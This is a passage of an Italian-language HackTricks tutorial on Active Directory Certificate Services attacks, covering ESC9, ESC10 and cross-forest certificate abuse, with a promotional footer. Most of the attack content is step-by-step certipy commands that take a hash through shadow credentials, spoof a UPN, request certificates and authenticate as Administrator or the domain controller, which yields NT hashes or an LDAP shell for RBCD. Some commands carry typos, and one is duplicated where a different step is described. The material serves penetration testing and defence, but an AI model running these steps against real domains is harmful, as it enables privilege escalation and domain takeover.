Supponiamo che `John@corp.local` abbia le autorizzazioni `GenericWrite` su `Jane@corp.local`, con l'obiettivo di compromettere `Administrator@corp.local`. Il modello di certificato `ESC9`, a cui `Jane@corp.local` ha il permesso di iscriversi, è configurato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.

Inizialmente, l'hash di `Jane` viene acquisito utilizzando le Credenziali Shadow, grazie al `GenericWrite` di `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo intenzionalmente la parte di dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Questa modifica non viola i vincoli, dato che `Administrator@corp.local` rimane distinto come `userPrincipalName` di `Administrator`.

Successivamente, il modello di certificato `ESC9`, contrassegnato come vulnerabile, viene richiesto come `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
È noto che il `userPrincipalName` del certificato riflette `Administrator`, senza alcun "object SID".

Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo originale, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Sto cercando di autenticarmi con il certificato emesso, ottenendo l'hash NT di `Administrator@corp.local`. Il comando deve includere `-domain <dominio>` a causa della mancanza di specifica del dominio nel certificato:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappature deboli dei certificati - ESC10

### Spiegazione

Due valori delle chiavi di registro sul controller di dominio sono indicati da ESC10:

- Il valore predefinito per `CertificateMappingMethods` sotto `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` è `0x18` (`0x8 | 0x10`), precedentemente impostato su `0x1F`.
- L'impostazione predefinita per `StrongCertificateBindingEnforcement` sotto `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` è `1`, precedentemente `0`.

**Caso 1**

Quando `StrongCertificateBindingEnforcement` è configurato come `0`.

**Caso 2**

Se `CertificateMappingMethods` include il bit `UPN` (`0x4`).

### Caso di abuso 1

Con `StrongCertificateBindingEnforcement` configurato come `0`, un account A con permessi di `GenericWrite` può essere sfruttato per compromettere qualsiasi account B.

Ad esempio, avendo i permessi di `GenericWrite` su `Jane@corp.local`, un attaccante mira a compromettere `Administrator@corp.local`. La procedura è simile a ESC9, consentendo l'utilizzo di qualsiasi modello di certificato.

Inizialmente, l'hash di `Jane` viene recuperato utilizzando le credenziali Shadow, sfruttando il `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione di vincolo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Successivamente, viene richiesto un certificato che abilita l'autenticazione del client come `Jane`, utilizzando il modello predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo valore originale, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L'autenticazione con il certificato ottenuto restituirà l'hash NT di `Administrator@corp.local`, rendendo necessaria la specifica del dominio nel comando a causa dell'assenza di dettagli di dominio nel certificato.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso di abuso 2

Con il flag `UPN` (`0x4`) presente nel campo `CertificateMappingMethods`, un account A con permessi di `GenericWrite` può compromettere qualsiasi account B che non abbia una proprietà `userPrincipalName`, inclusi gli account delle macchine e l'amministratore del dominio incorporato `Administrator`.

In questo caso, l'obiettivo è compromettere `DC$@corp.local`, partendo dall'ottenimento dell'hash di `Jane` tramite le credenziali Shadow, sfruttando il `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Il `userPrincipalName` di `Jane` viene quindi impostato su `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Viene richiesto un certificato per l'autenticazione del client come `Jane` utilizzando il modello predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene ripristinato al suo valore originale dopo questo processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Per autenticarsi tramite Schannel, viene utilizzata l'opzione `-ldap-shell` di Certipy, indicando il successo dell'autenticazione come `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Attraverso la shell LDAP, comandi come `set_rbcd` consentono attacchi di Delega Vincolata basata su risorse (RBCD), compromettendo potenzialmente il controller di dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Questa vulnerabilità si estende anche a qualsiasi account utente privo di `userPrincipalName` o in cui non corrisponde al `sAMAccountName`, con il valore predefinito `Administrator@corp.local` che rappresenta un obiettivo principale a causa dei suoi privilegi LDAP elevati e dell'assenza di un `userPrincipalName` di default.


## Compromettere le Foreste con Certificati Spiegato in Voce Passiva

### Rottura delle Trust delle Foreste tramite CA Compromesse

La configurazione per l'**iscrizione tra foreste** è resa relativamente semplice. Il **certificato CA radice** della foresta delle risorse viene **pubblicato nelle foreste degli account** dagli amministratori, e i **certificati CA aziendali** della foresta delle risorse vengono **aggiunti ai contenitori `NTAuthCertificates` e AIA in ogni foresta degli account**. Per chiarire, questo accordo concede al **CA nella foresta delle risorse il controllo completo** su tutte le altre foreste per le quali gestisce la PKI. Se questo CA viene **compromesso dagli attaccanti**, potrebbero essere **falsificati certificati per tutti gli utenti sia nella foresta delle risorse che nella foresta degli account**, violando così il confine di sicurezza della foresta.

### Privilegi di Iscrizione Concessi a Principali Esterni

In ambienti multi-foresta, è necessaria cautela riguardo ai CA aziendali che **pubblicano modelli di certificati** che consentono l'**iscrizione e la modifica da parte di Utenti Autenticati o principali esterni** (utenti/gruppi esterni alla foresta a cui appartiene il CA aziendale).\
Dopo l'autenticazione attraverso una trust, l'**SID degli Utenti Autenticati** viene aggiunto al token dell'utente da AD. Pertanto, se un dominio possiede un CA aziendale con un modello che **consente agli Utenti Autenticati di iscriversi**, potrebbe potenzialmente essere **iscritto da un utente di una foresta diversa**. Allo stesso modo, se **i diritti di iscrizione vengono esplicitamente concessi a un principale esterno da un modello**, viene creata una **relazione di controllo degli accessi tra foreste**, consentendo a un principale di una foresta di **iscriversi a un modello di un'altra foresta**.

Entrambi gli scenari portano a un **aumento della superficie di attacco** da una foresta all'altra. Le impostazioni del modello di certificato potrebbero essere sfruttate da un attaccante per ottenere privilegi aggiuntivi in un dominio esterno.

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
